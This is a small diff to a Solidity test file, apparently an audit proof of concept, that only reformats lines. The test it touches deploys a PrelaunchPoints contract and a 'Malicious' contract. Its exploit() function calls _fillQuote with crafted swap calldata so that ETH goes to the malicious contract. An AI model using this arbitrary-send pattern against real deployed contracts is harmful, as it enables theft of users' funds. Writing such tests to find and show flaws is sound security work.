@@ -31,14 +31,20 @@ contract TestArbitrarySend is Test {
         allowedTokens.push(address(mockToken));
 
         // Deploy the PrelaunchPoints contract
-        prelaunchPoints = new PrelaunchPoints(exchangeProxy, wethAddress, allowedTokens);
+        prelaunchPoints = new PrelaunchPoints(
+            exchangeProxy,
+            wethAddress,
+            allowedTokens
+        );
 
         // Deploy the Malicious contract
         malicious = new Malicious();
     }
 
     function exploit() external {
-        bytes memory swapCallData = abi.encodeWithSignature("maliciousFunction()");
+        bytes memory swapCallData = abi.encodeWithSignature(
+            "maliciousFunction()"
+        );
         // Trigger the _fillQuote function to send ETH to the malicious contract
         prelaunchPoints._fillQuote(swapCallData);
     }
